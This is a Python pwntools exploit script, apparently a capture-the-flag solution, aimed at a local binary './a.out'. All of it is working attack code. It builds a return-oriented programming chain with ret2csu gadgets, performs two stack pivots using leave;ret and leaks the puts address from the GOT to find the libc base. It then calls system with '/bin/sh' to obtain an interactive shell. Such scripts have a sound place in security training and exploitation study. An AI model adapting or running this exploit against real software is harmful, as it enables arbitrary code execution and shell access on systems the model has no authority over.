from pwn import *

r = process("./a.out")
#gdb.attach(r)

leave_ret = 0x000000000040117e
global_var = 0x404060

puts_got = 0x404018
puts = 0x401050
pop_rdi_ret = 0x0000000000401223
read = 0x401060
pop_rsi_r15_ret = 0x0000000000401221
ret = 0x000000000040101a

csu_1 = 0x40121a
csu_2 = 0x401200

bss = 0x00404d08


payload1 = b'a'*0x500
payload1 += p64(pop_rdi_ret) + p64(puts_got) + p64(puts)
payload1 += p64(csu_1) + p64(0) + p64(1) + p64(1) + p64(0) + p64(0x20) + p64(0x403e10)
payload1 += p64(csu_2) + p64(0)*7
payload1 += p64(pop_rdi_ret) + p64(0)
payload1 += p64(pop_rsi_r15_ret) + p64(bss) + p64(0)
payload1 += p64(read)
# stack pivot #2
payload1 += p64(csu_1) + p64(0) + p64(bss - 8) + p64(0)*4
payload1 += p64(leave_ret)
payload1 += b'a'*(0x1000 - len(payload1))
r.send(payload1)

r.recvuntil(b"everyone")

# stack pivot #1
payload2 = p64(0)*2 + p64(global_var - 8 + 0x500) + p64(leave_ret)

r.send(payload2)


stuff = r.recvuntil(b'\x7f')[-6:]
libc_base = int.from_bytes(stuff, "little") - 0x00000000000875a0

print(hex(libc_base))


binsh = libc_base + 0x1b75aa
system = libc_base + 0x0000000000055410

payload3 = p64(ret) + p64(pop_rdi_ret) + p64(binsh) + p64(system) 
r.send(payload3)


r.interactive()
